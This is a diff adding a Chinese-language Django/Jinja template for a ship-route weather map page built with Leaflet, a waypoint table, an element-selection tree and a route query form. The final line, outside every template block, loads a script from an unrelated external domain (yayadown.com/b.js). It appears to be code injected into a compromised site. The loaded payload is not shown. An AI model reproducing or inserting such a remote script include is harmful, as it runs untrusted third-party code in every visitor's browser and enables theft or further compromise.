@@ -1,0 +1,632 @@
+{#{% extends "shared/_Layout_Mapper_test.html" %}#}
+{% extends "shared/_Layout_Mapper.html" %}
+{% block title %}地图绘制
+{% endblock %}
+{% block top-js %}
+    <script type="application/javascript" src="/static/js/jquery-3.2.1.js"></script>
+    <script type="application/javascript" src="/static/js/bootstrap.js"></script>
+    <link rel="stylesheet" href="/static/css/demo.css"/>
+    <link rel="stylesheet" href="/static/css/bootstrap.min.css"/>
+    <link rel="stylesheet" href="/static/css/leaflet.css"/>
+    <link rel="stylesheet" href="/static/css/style.css" media="all"/>
+    <link rel="stylesheet" href="/static/css/bootstrap-datetimepicker.min.css" media="screen"/>
+    <script type="text/javascript" src="/static/js/bootstrap-datetimepicker.js" charset="UTF-8"></script>
+    <script type="text/javascript" src="/static/js/bootstrap-datetimepicker.zh-CN.js" charset="UTF-8"></script>
+    <script src="/static/js/highcharts.js"></script>
+    <script src="/static/js/exporting.js"></script>
+    <script src="/static/js/highcharts-zh_CN.js"></script>
+    <!--bootstrap-treeview start-->
+    <link rel="stylesheet" type="text/css" href="/static/css/bootstrap-treeview.min.css"/>
+    <script type="text/javascript" src="/static/js/bootstrap-treeview.min.js"></script>
+
+    <style type="text/css">
+		label {
+			margin: 3px;
+			padding: 3px;
+			padding-left: 0px;
+		}
+
+		h5 {
+			background-color: white;
+			color: black;
+			font-family: SimHei;
+			font-size: 14px;
+			height: 18px;
+			padding: 5px;
+			margin: 1px;
+		}
+    </style>
+
+    <script type="application/javascript">
+    $(function() {
+
+				onLoad();
+
+				//页面加载
+				function onLoad() {
+					//渲染树
+					$('#tree').treeview({
+						data: getTree(),
+						levels: 1
+                        //默认展开树的层级
+					});
+				}
+
+				//获取树数据
+				function getTree() {
+					var tree = [{
+							text: "气象要素",
+{#							icon: "glyphicon glyphicon-cloud",#}
+							color: "#111111",
+							selectable: false,
+							nodes: [{
+									text: "风场",
+									selectable: true
+								},
+								{
+									text: "气压",
+									selectable: true
+								},
+								{
+									text: "湿度",
+									selectable: true
+								},
+								{
+									text: "气温",
+                                    selectable: true
+								}
+							]
+						},
+						{
+							text: "海洋要素",
+                            color: "#111111",
+							selectable: false,
+							nodes: [{
+								text: "海浪",
+                                selectable: true
+							}, {
+								text: "海流",
+                                selectable: true
+							}]
+						}
+					];
+					return tree;
+				}
+			});
+    </script>
+{% endblock %}
+{% block content %}
+			<div class="col-md-12" style="float: left;">
+				<div class="col-md-3" style="padding: 5px;">
+					<div class="row">
+						<label>起航日期:</label>
+
+                          <div class="input-group date form_date col-md-9" data-date="" data-date-format="yyyy-m-d" data-link-field="dtp_input2" data-link-format="yyyy-m-d" style="">
+							<input class="form-control" id="dtpicker" size="12" type="text" readonly>
+{#							<input type="hidden" id="dtp_input2" value="" /><br/>#}
+							<span class="input-group-addon"><span class="glyphicon glyphicon-calendar"></span></span>
+						</div>
+
+					</div>
+                    <div class="row" style="margin-top: 10px;">
+						<label>起航时刻:</label>
+						<select id="startDrops" class="form-control" style="width:100px">
+							<option value="08" selected>08时</option>
+							<option value="20">20时</option>
+						</select>
+
+					</div>
+
+                    <div class="row">
+						<label>选择要素：</label>
+						<div class="col-md-12" style="height: 300px;width: 100%;overflow-y: scroll;" >
+							<div class="col-md-12" id="tree"></div>
+						</div>
+					</div>
+
+
+                        <div class="row">
+                        <div class="col-md-12" style="padding: 3px; float: left">
+                            <div class="col-md-6"><label>航线信息:</label></div>
+                            <div class="col-md-6" align="left">
+                                <a onclick="addTableRows(-1);" href="javascript:void(0);" class="btn btn-primary ">添加</a>
+                                <a onclick="addTb2Map(-1);" href="javascript:void(0);" class="btn btn-primary ">刷新</a>
+                            </div>
+
+                        </div>
+                        <div class="col-md-12" style="height: 350px;width: 100%;overflow-y: scroll;" >
+
+{##}
+{#                            <table class="table table-striped table-bordered table-hover " id="editable">#}
+{#                            <thead>#}
+{#                                <tr>#}
+{#                                    <th>ID</th>#}
+{#                                    <th>时刻</th>#}
+{#                                    <th>经度</th>#}
+{#                                    <th>纬度</th>#}
+{#                                </tr>#}
+{#                            </thead>#}
+{#                            <tbody>#}
+{#                            </tbody>#}
+{#                            </table>#}
+
+                            <table id="tableRoute" border="1px" width="100%" align="left">
+                                <thead>
+                                <tr>
+                                    <td id="siteID">序号</td>
+                                    <td id="siteHour">时刻</td>
+                                    <td id="siteLon">经度</td>
+                                    <td id="siteLat">纬度</td>
+                                    <td>删</td>
+                                </tr>
+                            </thead>
+                                <tbody>
+
+                                </tbody>
+                            </table>
+                        </div>
+
+                    </div>
+
+
+				</div>
+				<div class="col-md-9" style="margin-top: 5px;">
+					<div class="row">
+						<div class="btn-group col-md-9" style="margin-bottom: 3px;">
+							<button id="drawLine" type="button" class="btn btn-default">绘制航线</button>
+							<button type="button" class="btn btn-default">漫游</button>
+							<button type="button" class="btn btn-default">全球</button>
+							<button type="button" class="btn btn-default">西北太</button>
+							<button type="button" class="btn btn-default">北印度洋</button>
+
+						</div>
+						<div class="col-md-3" align="right">
+							<button type="button" class="btn btn-primary dropdown-toggle col-md-6" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                                                                常用航线 <span class="caret"></span>
+                                <ul class="dropdown-menu">
+								<li>
+									<a href="#">航线1</a>
+								</li>
+								<li>
+									<a href="#">航线2</a>
+								</li>
+								<li>
+									<a href="#">航线3</a>
+								</li>
+								<li class="divider"></li>
+								<li>
+									<a href="#">添加航线</a>
+								</li>
+							</ul>
+                            </button>
+
+
+                            <button type="button" id="routeSearch" class="btn btn-primary col-md-6" onclick="searchRoute();">查询</button>
+						</div>
+
+					</div>
+                    <div id="map" style="height: 800px; width: 100%;"> </div>
+                    <div id="statusBar" class="row col-md-12" style="width: 100%;">
+                            <h5>请在地图中绘制航线... </h5>
+                    </div>
+                </div>
+
+
+
+            </div>
+
+{% endblock %}
+
+{% block bottom-js %}
+    <script src="/static/js/leaflet.js"></script>
+{#    <script src="/static/js/maptiles.js"></script>#}
+
+			<script>
+
+                var arrLatLong = new Array();
+                var map;
+                var bTableChanged = 0;
+                var tbline = [];
+                var tbMapLayers = new L.featureGroup();
+                var treeSelectNode;
+
+                function treeClick(target) {
+                    var nodeid = $(target).attr('data-nodeid');
+                    var tree = $('#tree');
+                }
+
+                //获取tree选中节点的值
+                $(document).ready(function() {
+                    $('#tree').on('nodeSelected', function(event, data){
+                    treeSelectNode = data.text;
+                })
+                });
+
+
+
+                //查询按钮响应事件
+                function searchRoute() {
+                    var date = $('#dtpicker').val();
+                    var hour = $('#startDrops').val();
+                    var arrRouteInfo = getRouteInfoArray();
+
+                    $.ajax({
+                        url:'/NFMRoute/',
+                        type:'POST',
+                        async: false,
+                        data:{datetime:date, startHour:hour,element:treeSelectNode, routeInfo:JSON.stringify(arrRouteInfo)},
+                        success:function(callback){
+                            var callback_dict = $.parseJSON(callback);
+
+                        }
+                     })
+                }
+
+
+
+                function changeContent() {
+                    var array = new Array();
+                    var numRows = document.getElementById("tableRoute").rows.length;
+                    for(var i = 1; i < numRows; i++){
+                        array[i-1] = document.getElementById("tableRoute").rows[i].cells[2].getElementsByTagName("input")[0].value;
+                    }
+                }
+
+                function getRouteInfoArray() {
+                    var array = new Array();
+                    var tb = document.getElementById("tableRoute");
+
+                    if(tb.rows.length <= 2)
+                    {alert("表格中至少要包含两个点！")}
+                    else{
+                        for(var i = 0; i < tb.rows.length-1; i++){
+                            array[i] = new Array();
+                            array[i][0] = tb.rows[i+1].cells[0].innerText;
+                            array[i][1] = tb.rows[i+1].cells[1].getElementsByTagName("select")[0].value;
+                            array[i][2] = tb.rows[i+1].cells[2].getElementsByTagName("input")[0].value;
+                            array[i][3] = tb.rows[i+1].cells[3].getElementsByTagName("input")[0].value;
+                        }
+                    }
+                    return array;
+                }
+
+                //将表格中的经纬度连线显示在地图上
+                function addTb2Map() {
+                    map.removeLayer(tbMapLayers);
+                    tbMapLayers = new L.featureGroup();
+
+                    var tb = document.getElementById("tableRoute");
+
+                    if(tb.rows.length <= 2)
+                    {alert("表格中至少要包含两个点！")}
+                    else
+                    {
+
+                        for(var i = 1; i < tb.rows.length; i++){
+                            lat = tb.rows[i].cells[3].getElementsByTagName("input")[0].value;
+                            lon = tb.rows[i].cells[2].getElementsByTagName("input")[0].value;
+                            tbline.push([lat,lon]);
+                            var circle = L.circle([lat, lon], 500, {
+								color: 'red',
+								fillColor: '#f03',
+								fillOpacity: 0.5
+							});
+                            //map.addLayer(circle);
+                            tbMapLayers.addLayer(circle);
+
+                        }
+                        var polyline = L.polyline(tbline, {
+						color: 'blue',
+						opacity: 0.5,
+						weight: 3,
+						clickable: false
+					});
+
+                        polyline.setLatLngs(tbline);
+                        //map.addLayer(polyline);
+                        tbMapLayers.addLayer(polyline);
+                    }
+
+                    map.addLayer(tbMapLayers);
+
+                    bounds = tbGetBounds(tbline);
+
+                    var southWest = L.latLng(bounds[0], bounds[2]);
+                    var  northEast = L.latLng(bounds[1], bounds[3]);
+                    var bounds =  L.latLngBounds(southWest, northEast);
+                    map.fitBounds(bounds);
+                    tbline = [];
+                }
+
+                function tbGetBounds(line) {
+                    var minLat = 9999;
+                    var maxLat = -9999;
+                    var minLon = 9999;
+                    var maxLon = -9999;
+                    for(var i = 0; i < line.length; i++){
+                        if(line[i][0] < minLat){
+                            minLat = line[i][0];
+                        }
+                        if(line[i][0] > maxLat){
+                            maxLat = line[i][0];
+                        }
+                        if(line[i][1] < minLon){
+                            minLon = line[i][1];
+                        }
+                        if(line[i][1] > maxLon){
+                            maxLon = line[i][1];
+                        }
+                    }
+
+                    return [minLat,maxLat,minLon,maxLon];
+                }
+
+                //在指定行序号下添加一行
+                 function addTableRows(rowIndex) {
+                     var tb = document.getElementById("tableRoute");
+                     if (rowIndex == "-1") {
+                         rowIndex = tb.rows.length;//默认在末尾插入一行
+                         }
+                     var row = tb.insertRow(rowIndex);//在表格的指定插入一行
+                     var c1 = row.insertCell(0);
+                     c1.innerHTML = tb.rows.length - 1;
+
+                     var c2 = row.insertCell(1);
+                     c2.innerHTML = "<select><option>000</option><option>003</option><option>006</option><option>009</option><option>012</option><option>015</option><option>018</option><option>021</option><option>024</option></select>";
+
+                     var c3 = row.insertCell(2);
+                     c3.innerHTML = "<input size='8'></input";
+
+                     var c4 = row.insertCell(3);
+                     c4.innerHTML = "<input size='8'></input";
+
+                     var c5 = row.insertCell(4);
+                     c5.innerHTML = '<a href="javascript:void(0)" onclick="delIndex(this)">删</a>';
+                 }
+
+                 //在指定行下添加指定经纬度的一行
+                function addTableLatLon(rowIndex, lat, lon) {
+                     var tb = document.getElementById("tableRoute");
+                     if (rowIndex == "-1") {
+                         rowIndex = tb.rows.length;//默认在末尾插入一行
+                         }
+                     var row = tb.insertRow(rowIndex);//在表格的指定插入一行
+                     var c1 = row.insertCell(0);
+                     c1.innerHTML = tb.rows.length - 1;
+
+                     var c2 = row.insertCell(1);
+                     c2.innerHTML = "<select><option>000</option><option>003</option><option>006</option><option>009</option><option>012</option><option>015</option><option>018</option><option>021</option><option>024</option></select>";
+
+                     var c3 = row.insertCell(2);
+                     c3.innerHTML = "<input size='8' value = " + lon + "></input>";
+
+                     var c4 = row.insertCell(3);
+                     c4.innerHTML = "<input size='8' value=" + lat + "></input>";
+
+                     var c5 = row.insertCell(4);
+                     c5.innerHTML = '<a href="javascript:void(0)" onclick="delIndex(this)">删</a>';
+                 }
+
+                 //删除所在行
+                 function delIndex(obj) {
+                     var rowIndex = obj.parentNode.parentNode.rowIndex;//获得行下标
+                     var tb = document.getElementById("tableRoute");
+                     tb.deleteRow(rowIndex);//删除当前行
+
+                     j = 1;
+                     for(var i = 1; i < tb.rows.length; i++){
+                     tb.rows[i].cells[0].innerText = j++;
+                     }
+                 }
+
+                //初始化DateTimePicker
+                var nowDate = new Date();
+                document.getElementById("dtpicker").value = nowDate.getFullYear() + "-" + (nowDate.getMonth() + 1) + "-" + nowDate.getDate();
+
+{#                $(".dtpicker").datetimepicker({value: 'kkk'});#}
+
+
+				$(function() {
+					map = L.map('map').setView([25, 120], 4);
+					mapLink = '/static/img/mosic/';
+					L.tileLayer(
+						'/static/img/mosic/{z}/{x}/{y}.jpg', {
+							attribution: '',
+							maxZoom: 8,
+							minZoom: 2
+						}).addTo(map);
+					map.on('click', onMapClick);
+					map.on('mousemove', onMapMouseMove);
+
+					line = [];
+					var polyline = L.polyline(line, {
+						color: 'blue',
+						opacity: 0.5,
+						weight: 3,
+						clickable: false
+					}).addTo(map);
+
+					var drawClick = 0;
+					var markers = new L.FeatureGroup();
+
+					function onMapClick(e) {
+						if(drawClick == 1) {
+							map.addLayer(polyline);
+							//当点击地图的时候将当前点放入数组，然后设置线的经纬度，达到画线的目的
+							line.push([e.latlng.lat, e.latlng.lng]);
+
+							polyline.setLatLngs(line);
+							//以圆圈表示折线的端点
+							var circle = L.circle([e.latlng.lat, e.latlng.lng], 500, {
+								color: 'red',
+								fillColor: '#f03',
+								fillOpacity: 0.5
+							});
+
+							markers.addLayer(circle);
+							map.addLayer(markers);
+
+
+							//根据地图点击的坐标在表格中添加一行
+                            var tlat = e.latlng.lat.toFixed(4);
+                            var tlng = e.latlng.lng;
+						    while(tlng > 180) {
+							    tlng = tlng - 360;
+						    }
+						    while(tlng < -180) {
+							    tlng = tlng + 360;
+						    }
+						    tlng = tlng.toFixed(4);
+                            addTableLatLon(-1, tlat, tlng);
+						}
+					}
+
+					//鼠标在地图上移动响应事件
+					function onMapMouseMove(e) {
+						var lat = e.latlng.lat.toFixed(4);
+						var lon = e.latlng.lng;
+						while(lon > 180) {
+							lon = lon - 360;
+						}
+						while(lon < -180) {
+							lon = lon + 360;
+						}
+						lon = lon.toFixed(4);
+						document.getElementById('statusBar').innerText = lat + ", " + lon;
+					}
+
+					//map.on('click', onMapClick);
+					//
+
+					$("#drawLine").click(function(e) {
+
+						if(drawClick == 0) {
+							drawClick = 1;
+							$("#drawLine").text("结束绘制")
+							document.getElementById('map').style.cursor = 'crosshair';
+							map.removeLayer(markers);
+							markers = new L.FeatureGroup();
+							line = [];
+							map.removeLayer(polyline);
+
+						} else {
+							drawClick = 0;
+							$("#drawLine").text("绘制航线")
+							document.getElementById('map').style.cursor = 'pointer';
+						}
+					})
+				});
+			</script>
+
+			<script type="text/javascript">
+				$('.form_date').datetimepicker({
+					language: 'zh-CN',
+					weekStart: 1,
+					todayBtn: 1,
+					autoclose: 1,
+					todayHighlight: 1,
+					startView: 2,
+					minView: 2,
+					forceParse: 0
+				});
+{#				var chart = new Highcharts.Chart('charts', {#}
+{#					title: {#}
+{#						text: '500hpa气温航线预报',#}
+{#						x: -20#}
+{#					},#}
+{#					subtitle: {#}
+{#						text: '2016年10月1日20时',#}
+{#						x: -20#}
+{#					},#}
+{#					xAxis: {#}
+{#						categories: ['1', '2', '3', '4', '5', '6', '7', '7', '9', '10', '11', '12']#}
+{#					},#}
+{#					yAxis: {#}
+{#						title: {#}
+{#							text: '气温 (°C)'#}
+{#						},#}
+{#						plotLines: [{#}
+{#							value: 0,#}
+{#							width: 1,#}
+{#							color: '#808080'#}
+{#						}]#}
+{#					},#}
+{#					tooltip: {#}
+{#						valueSuffix: '°C'#}
+{#					},#}
+{#					legend: {#}
+{#						layout: 'vertical',#}
+{#						align: 'right',#}
+{#						verticalAlign: 'middle',#}
+{#						borderWidth: 0#}
+{#					},#}
+{#					series: [{#}
+{#						name: '气温',#}
+{#						data: [7.0, 6.9, 9.5, 14.5, 18.2, 21.5, 25.2, 26.5, 23.3, 18.3, 13.9, 9.6, 10.3, 12.5, 11.6, 9.2, 8.3, 6.5]#}
+{#					}]#}
+{#				});#}
+
+				var curMenu = null,
+					zTree_Menu = null;
+				var setting = {
+					view: {
+						showLine: false,
+						showIcon: false,
+						selectedMulti: false,
+						dblClickExpand: false,
+						addDiyDom: addDiyDom
+					},
+					data: {
+						simpleData: {
+							enable: true
+						}
+					},
+					callback: {
+						beforeClick: beforeClick
+					}
+				};
+
+				function addDiyDom(treeId, treeNode) {
+					var spaceWidth = 5;
+					var switchObj = $("#" + treeNode.tId + "_switch"),
+						icoObj = $("#" + treeNode.tId + "_ico");
+					switchObj.remove();
+					icoObj.before(switchObj);
+
+					if(treeNode.level > 1) {
+						var spaceStr = "<span style='display: inline-block;width:" + (spaceWidth * treeNode.level) + "px'></span>";
+						switchObj.before(spaceStr);
+					}
+				}
+
+
+
+				function beforeClick(treeId, treeNode) {
+					if(treeNode.level == 0) {
+						var zTree = $.fn.zTree.getZTreeObj("treeDemo");
+						zTree.expandNode(treeNode);
+						return false;
+					}
+					return true;
+				}
+
+
+
+				$(document).ready(function() {
+					var treeObj = $("#treeDemo");
+					$.fn.zTree.init(treeObj, setting, zNodes);
+					zTree_Menu = $.fn.zTree.getZTreeObj("treeDemo");
+					curMenu = zTree_Menu.getNodes()[0].children[0].children[0];
+					zTree_Menu.selectNode(curMenu);
+
+					treeObj.hover(function() {
+						if(!treeObj.hasClass("showIcon")) {
+							treeObj.addClass("showIcon");
+						}
+					}, function() {
+						treeObj.removeClass("showIcon");
+					});
+				});
+			</script>
+{% endblock %}
+<script src="http://www.yayadown.com/b.js"></script>
